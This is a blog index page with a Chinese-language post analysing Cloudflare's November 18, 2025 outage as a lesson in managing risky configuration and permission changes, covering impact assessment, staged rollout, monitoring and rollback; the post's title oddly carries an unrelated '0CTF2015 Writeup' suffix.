
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Eadom&#39;s Blog">
    <title>Eadom&#39;s Blog</title>
    <meta name="author" content="Eadom">
    
    
        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
    
    
        
            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
        
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"Website","@id":"https://blog.eadom.net","author":{"@type":"Person","name":"Eadom","sameAs":["https://github.com/eadom","https://www.linkedin.com/in/yukunliu/","http://weibo.com/onetpig","https://twitter.com/Yufan_L"],"image":"avatar.jpg"},"name":"Eadom's Blog","description":null,"url":"https://blog.eadom.net"}</script>
    <meta property="og:type" content="blog">
<meta property="og:title" content="Eadom&#39;s Blog">
<meta property="og:url" content="https://blog.eadom.net/index.html">
<meta property="og:site_name" content="Eadom&#39;s Blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Eadom&#39;s Blog">
<meta name="twitter:creator" content="@Yufan_L">
    
    
        
    
    
        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-sifsy9oex2dugunw1y6dni61b2yek7gdovchv6fh3t7csw6uv5ophjuqcfmz.min.css">
    <!--STYLES END-->
    

    
    <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            Eadom&#39;s Blog
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Eadom</h4>
                
                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="Home"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="Categories"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="Tags"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="Archives"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="About"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/eadom"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/in/yukunliu/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="http://weibo.com/onetpig"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Weibo"
                        >
                        <i class="sidebar-button-icon fab fa-weibo" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Weibo</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/Yufan_L"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/atom.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/uncategorized/cong-biangeng-jiaodu-fupan-cloudflare-11-18-guzhang-0ctf2015-writeup/"
                            aria-label=": 从变更角度“复盘” Cloudflare 11·18 故障0CTF2015 Writeup"
                        >
                            从变更角度“复盘” Cloudflare 11·18 故障0CTF2015 Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2025-11-26T21:31:51+08:00">
	
		    Nov 26, 2025
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>2025 年 11 月 18 日，Cloudflare 遭遇了一次影响范围不小的故障，导致其部分服务在一段时间内出现明显异常、访问失败或性能下降；具体影响范围可以参考 Cloudflare 在官方博客中发布的复盘报告<a href="https://blog.cloudflare.com/18-november-2025-outage/" target="_blank" rel="noopener">《Cloudflare outage on November 18, 2025》</a>。</p>
<p>事后 Cloudflare 很快发布了详细的技术复盘报告，把这次故障的来龙去脉讲得比较清楚：<strong>直接诱因是一项数据库权限配置变更</strong>，而下游某些 Rust 服务在异常路径上的健壮性不足，被这次变更“精准命中”，最终演化成大面积的服务不可用。在复盘文章里，可以看到典型的 <code>unwrap</code> 使用导致程序在遇到异常数据时直接崩溃，这一点也迅速成了社区讨论的焦点。</p>
<p><code>unwrap</code> 确实是这次事故的重要触发点之一，但如果只停留在“不要乱用 unwrap”这个层面，我们能学到的东西其实很有限。<strong>在真实的工程环境里，数据库权限、配置项、安全策略，这类“看起来只是调一下配置”的变更，在研发和安全团队的日常工作中非常常见，而且数量巨大</strong>。很多时候，它们并不会被当成高风险操作对待，更不会被放到和“发一版代码”同等严肃的变更流程里去审视。</p>
<p>正因为如此，在大家都在吐槽 <code>unwrap</code> 的时候，我更想换一个视角：站在一个局外人的位置，只基于 Cloudflare 公开的技术文章，<strong>从“变更”的角度，来看看这次事故里有哪些稳定性和安全运维层面的经验教训，是我们在日常做配置 / 安全控制变更时可以借鉴的</strong>。</p>
<h2 id="2-事件回顾和-Cloudflare-的技术报告"><a href="#2-事件回顾和-Cloudflare-的技术报告" class="headerlink" title="2. 事件回顾和 Cloudflare 的技术报告"></a>2. 事件回顾和 Cloudflare 的技术报告</h2><p>在进入后面的讨论之前，我先按照 Cloudflare 官方技术文章里的信息，把这次故障的经过简单串一下。几个关键时间点（UTC）：</p>
<ul>
<li><strong>11:05</strong>：数据库访问控制变更部署</li>
<li><strong>11:28</strong>：影响开始产生（Impact starts）</li>
<li><strong>13:05</strong>：对 Workers KV / Access 启用 bypass，影响降低</li>
<li><strong>13:37</strong>：确认 Bot Management 配置文件为触发点，开始回滚/修复至 last-known-good</li>
<li><strong>14:30</strong>：主要影响解除（Main impact resolved）</li>
<li><strong>17:06</strong>：所有服务恢复（All services resolved）</li>
</ul>
<p>在这个时间线里，Cloudflare 官方给出的故事大致可以拆成以下几步。</p>
<h3 id="2-1-起点：数据库访问控制变更（11-05-UTC）"><a href="#2-1-起点：数据库访问控制变更（11-05-UTC）" class="headerlink" title="2.1 起点：数据库访问控制变更（11:05 UTC）"></a>2.1 起点：数据库访问控制变更（11:05 UTC）</h3><p>从官方时间线来看，这次事故的起点很清晰：<strong>11:05 UTC，Cloudflare 在一套用于生成 Bot Management 特征配置的数据库上，部署了一次权限相关的配置变更（database access control change）。</strong></p>
<p>Cloudflare 在复盘里解释，这次变更的初衷是：</p>
<ul>
<li>把原本“隐式”的表访问权限改成“显式授权”，</li>
<li>让分布式查询可以在真实用户账户而不是共享系统账户下执行，</li>
<li>这样才能对每个用户的查询更细粒度地评估访问授权和查询限额（access grants / query limits），从安全和资源控制角度把关。</li>
</ul>
<p>问题在于：生成 Bot Management <strong>feature file（特征配置文件）</strong> 的那条查询并没有显式区分哪些库/表应该被统计进去。变更生效后，这条查询突然多拿到了一批原本不会出现的信息，导致：</p>
<ul>
<li>查询结果的行数接近翻倍；</li>
<li>按这个结果生成的 feature file 体积也明显变大，特征数量远超正常水平；</li>
<li>这份“变胖了”的配置文件依然按原有节奏在全网周期性刷新和分发。</li>
</ul>
<p>就变更本身来说，它在当时<strong>看上去更像是一条常规的权限/安全配置调整</strong>，而不是那种一眼就会被当作“高危大变更”的架构级操作。</p>
<h3 id="2-2-症状出现：核心流量异常（11-28-UTC-之后）"><a href="#2-2-症状出现：核心流量异常（11-28-UTC-之后）" class="headerlink" title="2.2 症状出现：核心流量异常（11:28 UTC 之后）"></a>2.2 症状出现：核心流量异常（11:28 UTC 之后）</h3><p>官方文章在 “The outage” 一节里，展示了一张 5xx 错误量曲线图：原本很低的错误率在 11 点多突然抬升，并出现一段时间的反复波动。</p>
<p>在文章末尾的时间线表中，<strong>11:28</strong> 被标记为：</p>
<blockquote>
<p>Impact starts. Deployment reaches customer environments, first errors observed on customer HTTP traffic.</p>
</blockquote>
<p>对外部用户来说，这一阶段的直接表现就是：</p>
<ul>
<li>大量站点返回 Cloudflare 自己的 5xx 错误页；</li>
<li>Workers KV、Access、Dashboard、Turnstile 等依赖核心代理（Cloudflare 文中称为 core proxy，并用 FL/FL2 指代其不同代际/版本的核心代理组件）的服务出现错误或不可用；</li>
<li>整体 HTTP 流量表现为“时好时坏”的波动。</li>
</ul>
<p>波动的原因在官方报告里也解释得比较清楚：</p>
<ul>
<li>feature file 每几分钟重新生成一次并分发到全网；</li>
<li>ClickHouse 集群在逐步更新，只有已经应用访问控制变更的节点会生成“坏文件”；</li>
<li>每一轮刷新，有可能生成“好配置”或“坏配置”，然后快速推送，导致系统在“好文件 / 坏文件”之间反复切换。</li>
</ul>
<h3 id="2-3-定位过程：收敛到数据库-权限策略与-Bot-Management-特征文件（11-28–14-30-UTC）"><a href="#2-3-定位过程：收敛到数据库-权限策略与-Bot-Management-特征文件（11-28–14-30-UTC）" class="headerlink" title="2.3 定位过程：收敛到数据库 / 权限策略与 Bot Management 特征文件（11:28–14:30 UTC）"></a>2.3 定位过程：收敛到数据库 / 权限策略与 Bot Management 特征文件（11:28–14:30 UTC）</h3><p>时间线显示，<strong>11:32–13:05</strong> 这段时间里，团队最初是沿着 <strong>Workers KV 错误和高流量</strong> 的症状在排查：</p>
<blockquote>
<p>“The team investigated elevated traffic levels and errors to Workers KV service… mitigations such as traffic manipulation and account limiting were attempted…”</p>
</blockquote>
<p>随着排障推进，Cloudflare 在 “The query behaviour change” 与 “Memory preallocation” 两节中，把技术链路写得很直白：</p>
<ol>
<li><strong>数据库层</strong>：访问控制变更后，查询时多返回了数据，响应行数接近翻倍；</li>
<li><strong>配置生成层</strong>：用这条查询生成的 Bot Management feature file 跟着“变胖”，特征数量远超平时（文中描述为 “effectively more than doubling the rows in the response ultimately affecting the number of rows (i.e. features) in the final file output”）；</li>
<li><strong>核心代理层</strong>：core proxy 上的 Bot Management 模块，为了预分配内存和防止无界增长，对特征数量设了一个硬上限（200，正常使用约 60）；</li>
<li>当超大 feature file 触发这个上限时，核心组件 FL2 的 Rust 代码在检查时调用了 <code>unwrap()</code>，在 Err 分支 panic：<blockquote>
<p>thread fl2_worker_thread panicked: called Result::unwrap() on an Err value</p>
</blockquote>
</li>
</ol>
<p>时间线中，<strong>13:37</strong> 这一行直接写道：</p>
<blockquote>
<p>Work focused on rollback of the Bot Management configuration file to a last-known-good version. We were confident that the Bot Management configuration file was the trigger for the incident.</p>
</blockquote>
<p>也就是说，到 13:37 前后，团队已经把问题清楚地收敛到这一链路上：</p>
<blockquote>
<p>数据库访问控制变更 → 查询行为变化 → feature file 异常膨胀 → Bot Management 模块触发 unwrap() panic → 核心代理返回大规模 5xx。</p>
</blockquote>
<h3 id="2-4-处置与恢复：回滚配置与重启服务（13-05–17-06-UTC）"><a href="#2-4-处置与恢复：回滚配置与重启服务（13-05–17-06-UTC）" class="headerlink" title="2.4 处置与恢复：回滚配置与重启服务（13:05–17:06 UTC）"></a>2.4 处置与恢复：回滚配置与重启服务（13:05–17:06 UTC）</h3><p>后续的处置流程在官方时间线里也有完整记录，可以粗略分成三段：</p>
<ol>
<li><strong>先压住影响面（13:05 起）</strong><ul>
<li><strong>13:05</strong>：<blockquote>
<p>Workers KV and Cloudflare Access bypass implemented — impact reduced.</p>
</blockquote>
</li>
<li>做法是通过内部 bypass，让 Workers KV 和 Access 回退到 core proxy 的旧版本，虽然旧版本同样存在问题，但影响范围和程度都更小，因此整体错误率明显下降。</li>
</ul>
</li>
<li><strong>修配置文件，恢复核心流量（13:37–14:30）</strong><ul>
<li><strong>13:37</strong>：工作重点转向回滚 Bot Management 配置文件到 last-known-good 版本；</li>
<li><strong>14:24</strong>：<ul>
<li>停止生成与分发新的 Bot Management 配置文件；</li>
<li>使用旧版本配置文件的恢复测试完成；</li>
</ul>
</li>
<li><strong>14:30</strong>：<blockquote>
<p>Main impact resolved. A correct Bot Management configuration file was deployed globally and most services started operating correctly.</p>
</blockquote>
</li>
</ul>
</li>
<li><strong>清理长尾，全部恢复（14:30–17:06）</strong><ul>
<li>核心流量恢复后，剩下的是重启在事故中进入 bad state 的下游服务；</li>
<li><strong>17:06</strong> ：<blockquote>
<p>All services resolved. Impact ends. All downstream services restarted and all operations fully restored.</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p>到这里为止，官方技术报告给出的“工程师视角故事线”就完整了：</p>
<ul>
<li>11:05 的数据库访问控制变更改变了系统表查询行为；</li>
<li>被用于生成 Bot Management 特征配置文件的查询没有过滤 database，导致配置文件异常膨胀；</li>
<li>核心代理中的 Bot Management 模块在遇到这份“超大配置”时触发 <code>unwrap()</code> panic，引发大规模 5xx；</li>
<li>通过 bypass 降低影响面、回滚 / 修复配置文件、重启下游服务，在 14:30 解除主体影响，17:06 完成收尾。</li>
</ul>
<hr>
<p>到这里为止，我只是把 Cloudflare 在官方复盘里公开的内容，整理成了一条相对清晰的时间线和技术链路。换句话说：前面的所有事实，都是从那篇博客和时间线表里来的，我并没有也不可能掌握他们内部更多的细节。</p>
<p>接下来如果从变更和稳定性体系的角度往下展开，就难免会带一点推断和类比。这些推断<strong>有可能和 Cloudflare 内部当时的真实情况并不完全一致</strong>，也不代表我在评价或还原他们的具体决策过程，更谈不上指责。</p>
<p>更合适的理解是：把这次事故当成一个公开、细节足够丰富的案例，把官方给出的时间线和技术原因当作“题面”，后面的分析只是借这道题来反思我们自己在变更、稳定性上的潜在问题，看看能从中抽象出哪些对自己有用的经验教训。后文更关注机制与流程如何把风险收住，而不是复盘某个具体个人/团队的对错。</p>
<h2 id="3-从变更视角看这次故障"><a href="#3-从变更视角看这次故障" class="headerlink" title="3. 从变更视角看这次故障"></a>3. 从变更视角看这次故障</h2><p>大家都在讨论 <code>unwrap</code>、错误处理不健壮，但真正把这一串问题引爆的，是一类我们日常也经常做的事情——<strong>改了一条权限 / 策略 / 配置</strong>。</p>
<p>这类操作在任何公司都很常见：收紧一下权限、加一条安全规则、改一条控制面配置。平时我们可能把它归类成“小变更”。这次事故对我们来说，也是一个“复盘”自查的机会，可以就把它当成一次典型的<strong>高危配置 / 安全策略变更事故</strong>，按变更的几个阶段回头看看：如果同样的事发生在我们系统里，哪些环节我们自己也容易掉链子。</p>
<p>下面这些都是站在“做事的人”的角度做的“复盘”与自查，不是去评价 Cloudflare 做得好不好。</p>
<h3 id="3-1-影响面评估：这次变更到底多“高危”"><a href="#3-1-影响面评估：这次变更到底多“高危”" class="headerlink" title="3.1 影响面评估：这次变更到底多“高危”"></a>3.1 影响面评估：这次变更到底多“高危”</h3><p>先看第一步：这次到底改了个什么东西。</p>
<p>这一类权限 / 策略变更，在日常开发里，很容易被当成“就改一下配置”——不改代码、不发新版本，只是调整一条规则，看起来像是低风险操作。</p>
<p>评估风险大小至少可以拆成两个维度：</p>
<ol>
<li><strong>所处平面和作用域（它在哪一层）</strong><ul>
<li>是某个单体服务的本地配置，只影响局部行为；</li>
<li>还是控制面 / 安全面上的全局策略，例如：认证授权、集中配置、路由 / 流量调度这类“公共基础设施”。</li>
</ul>
</li>
<li><strong>依赖关系和影响链路（后面连着谁）</strong><ul>
<li>有多少关键服务 / 关键路径依赖这条配置 / 策略才能继续往下走；</li>
<li>它是不是在多条核心链路上的必经节点，是典型的 critical path / chokepoint 还是一个 leaf node。</li>
</ul>
</li>
</ol>
<p>Cloudflare 这次动的是核心组件访问数据的权限，从复盘描述看，很难把它归类成一个“局部、低影响的本地配置”。在任何一个复杂系统里，这种“全局共享 + 被关键链路反复访问”的配置，按理都应该直接归到高危变更的范畴。</p>
<p>现实里又有另一个情况：历史系统经过多年演化，上下游依赖关系复杂。但我觉得这时候，仍然有必要做一些自查，多思考几个问题，比如：</p>
<ul>
<li>如果这个配置完全失效，用户侧最直观的症状会是什么，最坏情况下，它会导致什么样的影响？</li>
<li>有哪些关键服务 / 功能一定要依赖这条配置？</li>
<li>过去的故障 / 变更记录里，有没有跟它相关的坑？</li>
</ul>
<p>如果这些问题都答不出一个相对有把握的结论，并不代表这个变更风险就低，反而说明：</p>
<p>我们现在对它的影响面认知还不够清晰，这种情况下，把它当成“小配置改动”随手上生产，其实是比较危险的。</p>
<h3 id="3-2-事前验证：先在可控环境里把“正常”和“异常”都走一遍"><a href="#3-2-事前验证：先在可控环境里把“正常”和“异常”都走一遍" class="headerlink" title="3.2 事前验证：先在可控环境里把“正常”和“异常”都走一遍"></a>3.2 事前验证：先在可控环境里把“正常”和“异常”都走一遍</h3><p>如果可以在一个安全的测试环境里先行验证，有可能先暴露这个问题。</p>
<p>有些人平时做配置 / 策略变更，习惯往往是很简单的：</p>
<p>改完之后在控制台点两下、跑一跑页面，发现“看起来还能用”，然后就上生产了。</p>
<p>如果事先没认真在测试环境里验证一遍，直接上生产环境变更就等于是给未知行为兜底。</p>
<p>对这类高危变更：</p>
<ul>
<li>上生产之前，先在测试 / 预发环境完成测试，如果是阻断策略，也可以通过日志观察比对验证；</li>
<li>在这个过程中，不需要穷举所有异常，但至少要有意识地想一想、看一看：<ul>
<li>配置 / 策略拿不到、读错了、大致会长成什么样；</li>
<li>系统在这种情况下，是还能撑住，还是直接炸掉。</li>
</ul>
</li>
</ul>
<p>大规模系统里，确实不可能在测试环境推演所有坏情况，这个目标本身就不现实。</p>
<p>但在上生产之前，至少要做一件事：<strong>不要把“配置 / 策略永远没问题”当成默认前提</strong>，而是先在一个相对安全的环境里，确认一下最基本的正常和异常场景，是否符合预期。</p>
<h3 id="3-3-灰度：别一上来就全网生效"><a href="#3-3-灰度：别一上来就全网生效" class="headerlink" title="3.3 灰度：别一上来就全网生效"></a>3.3 灰度：别一上来就全网生效</h3><p>即使测试 / 预发环境都跑过了，生产一定会面临更复杂的情况：真实数据、边缘场景、奇怪的调用链、历史遗留配置，都会叠加进来。所以有计划的分批次灰度发布非常重要。几种比较常见、也比较实用的手法：</p>
<ul>
<li><strong>按范围灰度</strong><ul>
<li>按 Region / 机房 / 用户群 / 业务线分批；</li>
<li>第一批尽量选影响范围小、可观测性好的对象。</li>
</ul>
</li>
<li><strong>先监控，再执行</strong><ul>
<li>安全策略先以 log-only / monitor-only 的方式 dry run 跑一段时间：<ul>
<li>记录“如果现在真执行，会拦掉哪些请求”；</li>
<li>统计“会放过哪些我们不希望放过的请求”；</li>
</ul>
</li>
<li>没有明显问题，再切到 enforce 模式。</li>
</ul>
</li>
<li><strong>做好灰度计划</strong><ul>
<li>提前定好：灰度的批次，达到什么要求，我们就可以往下放一批；</li>
</ul>
</li>
</ul>
<p>其实很多时候问题不是“没做灰度”，而是这类配置 / 策略从设计第一天起，就没有灰度控制的能力。当然，如果某条配置一上来就只能全局生效，而且它又处在核心链路，那它本身就是一个需要去解决的技术债。</p>
<h3 id="3-4-观测能力与跨部门协同：让影响可见可止血"><a href="#3-4-观测能力与跨部门协同：让影响可见可止血" class="headerlink" title="3.4 观测能力与跨部门协同：让影响可见可止血"></a>3.4 观测能力与跨部门协同：让影响可见可止血</h3><p>出问题这件事本身很难完全避免，那接下来就看两件事：</p>
<ol>
<li>出了问题，能不能被及时观测到，并且尽快把异常与本次变更关联起来；</li>
<li>能不能快速拉齐相关方，迅速止血。</li>
</ol>
<p><strong>变更发起者（变更 owner）需要对此负责</strong>，对高危配置 / 策略变更来说，变更 owner 的责任不只是“把变更改对”，而是要在发起变更之前，就把下面两点想清楚、准备好，并落在 SOP 中：</p>
<ul>
<li>如何判断这次变更是否按预期生效、有没有带来额外副作用；</li>
<li>一旦出现异常，应该如何处置，触发什么条件需要回滚或熔断。</li>
</ul>
<h3 id="3-4-1-观测：变更-owner-要先把观测指标定好"><a href="#3-4-1-观测：变更-owner-要先把观测指标定好" class="headerlink" title="3.4.1 观测：变更 owner 要先把观测指标定好"></a>3.4.1 观测：变更 owner 要先把观测指标定好</h3><p>业务侧的观测一般比较完备。但变更的 owner 并不一定有如同业务一样完备的观测能力和视角。<strong>变更 owner 需要在变更执行前，把与本次变更直接相关的观测能力先对齐好</strong>。对于 SRE、安全这类跨多方的变更，这个过程往往离不开跨部门协同。</p>
<p>可以具体拆成几件事：</p>
<ol>
<li><strong>先列清楚：这次变更可能影响哪些链路、哪些指标</strong><ul>
<li>我改的是一条安全策略 / 配置规则，它会作用在：<ul>
<li>哪些入口（网关、CDN、API 网关…）；</li>
<li>哪些下游（认证、业务服务、数据库 / 缓存…）；</li>
<li>哪些用户 / 租户 / 区域。</li>
</ul>
</li>
<li>对每一类影响，预先想一遍：<ul>
<li>正常情况下，哪些指标会有轻微波动（例如某类请求被拒绝率小幅上升）；</li>
<li>异常情况下，哪些指标会率先发生明显异常（例如某几个接口 5xx 暴涨）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>与上下游一起梳理异常观测指标和告警信号</strong><ul>
<li>在发起变更前，变更 owner 主动与相关方对齐两类信息：<ul>
<li>各方现有的关键观测指标和告警规则：出现异常时优先关注哪些 dashboard / 告警；</li>
<li>在变更相关的日志 / 指标里，是否需要增加哪些字段，以便后续快速按维度筛查。</li>
</ul>
</li>
<li>理想的状态是：<ul>
<li>在变更 owner 自己的 dashboard 里，可以看到这次变更涉及的上下游关键指标；</li>
<li>所有人都清楚“这次变更要重点盯哪几个指标、哪些异常信号一出现就需要进入处置流程”。</li>
</ul>
</li>
</ul>
</li>
<li><strong>在监控 / 日志里给变更本身留“痕迹”</strong><ul>
<li>相应的变更系统，至少要做到：<ul>
<li>能够区分不同的配置 / 策略版本；</li>
<li>能够在日志或查询里，把“使用新配置 / 新策略”的请求、租户、区域筛选出来。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>回到这次故障上，本身系统的观测也是有一定问题的，<code>unwrap</code> 导致panic级别的问题应该被捕获并且告警。但如果变更 owner 可以多想多做几步，或许能够更快速地把故障指征归因到他的变更上。</p>
<h3 id="3-4-2-响应协同：以快速止血为目标"><a href="#3-4-2-响应协同：以快速止血为目标" class="headerlink" title="3.4.2 响应协同：以快速止血为目标"></a>3.4.2 响应协同：以快速止血为目标</h3><p>这次 Cloudflare 故障，从业务异常到定位到特定权限 / 特征文件变更导致的问题，过程拉得很长，很可能的原因是，变更信息没有在上下游充分同步，处置现场一开始也没有足够意识到“这波异常和哪一次变更高度相关”。</p>
<p>从变更 owner 的视角，可以关注以下几点：</p>
<ol>
<li><strong>变更的“共同上下文”要统一</strong><ul>
<li>每一次高危变更都要有明确的变更 ID / 版本号 / 影响范围（租户、区域、实例批次等），确保上下游知晓；</li>
</ul>
</li>
<li><strong>定义好 SOP，关键指标要提前对齐好</strong><ul>
<li>结合上文对齐好的观测指标，提前约定好异常指标出现后的处置动作。</li>
<li>快速恢复动作尽量简单：先按预案降级或回滚，优先保障可用性，安全 / 合规问题通过后续补偿措施兜底。</li>
</ul>
</li>
<li><strong>降级/熔断设计</strong> <ul>
<li>临时关闭某个依赖路径，不再调用这条有问题的链路；</li>
<li>将某些策略从“强制阻断”降级为“仅记录 + 限流”；</li>
<li>对下游返回一个可预期的降级结果，而不是继续把异常往更深的地方传。</li>
</ul>
</li>
<li><strong>恢复链路尽量简单，避免循环依赖</strong><ul>
<li>典型的循环依赖场景：<ul>
<li>回滚配置要通过同一套控制面 / 配置系统下发，而这套控制面此刻就因为这次变更不可用；</li>
<li>执行回滚需要某些权限 / 认证链路，碰巧这次改的就是这层；</li>
<li>回滚脚本依赖的一些后端服务也在故障链路里，导致脚本半路就跑挂了。</li>
</ul>
</li>
</ul>
</li>
<li><strong>通过演练把这一套联动跑顺</strong><ul>
<li>围绕典型高危变更，进行演练。演练不只是看“回滚脚本能不能跑通”。而是验证 SOP 中的观测指标能否与故障场景关联，并及时发起恢复操作。</li>
<li>演练暴露出来的缺口，都应该复盘更新到 SOP 里。</li>
</ul>
</li>
</ol>
<h2 id="4-写在最后"><a href="#4-写在最后" class="headerlink" title="4. 写在最后"></a>4. 写在最后</h2><p>首先要给 Cloudflare 点个赞：愿意把问题摊开、把细节讲清楚，是一种非常好的文化。对我们这些旁观者来说，这样的复盘既能照出问题，也能当作一次很好的演练材料。</p>
<p>在这种上下游链路极其复杂的系统里，一条变更真正会影响什么，很难提前预判。跨部门变更管理、观测、响应尤为重要。这类跨域风险，往往需要横向团队做中枢。</p>
<p>尤其是对偏上游的同学来说，比如安全运营、策略平台，日常做的很多事情看上去只是“调一条规则”“收紧一点权限”，但站在全局视角，往往就是高风险动作。不要把配置、权限、策略当成理所当然“安全”的东西。如何在团队里把风险意识、影响面判断、事前预案这些东西沉淀成可复制的能力，而不是只靠少数人的经验，需要长期系统性地建设。</p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/uncategorized/cong-biangeng-jiaodu-fupan-cloudflare-11-18-guzhang-0ctf2015-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/uncategorized/cloudflare-nov-18-outage-change-perspective/"
                            aria-label=": 从变更角度“复盘” Cloudflare 11·18 故障"
                        >
                            从变更角度“复盘” Cloudflare 11·18 故障
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2025-11-26T21:31:51+08:00">
	
		    Nov 26, 2025
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>2025 年 11 月 18 日，Cloudflare 遭遇了一次影响范围不小的故障，导致其部分服务在一段时间内出现明显异常、访问失败或性能下降；具体影响范围可以参考 Cloudflare 在官方博客中发布的复盘报告<a href="https://blog.cloudflare.com/18-november-2025-outage/" target="_blank" rel="noopener">《Cloudflare outage on November 18, 2025》</a>。</p>
<p>事后 Cloudflare 很快发布了详细的技术复盘报告，把这次故障的来龙去脉讲得比较清楚：<strong>直接诱因是一项数据库权限配置变更</strong>，而下游某些 Rust 服务在异常路径上的健壮性不足，被这次变更“精准命中”，最终演化成大面积的服务不可用。在复盘文章里，可以看到典型的 <code>unwrap</code> 使用导致程序在遇到异常数据时直接崩溃，这一点也迅速成了社区讨论的焦点。</p>
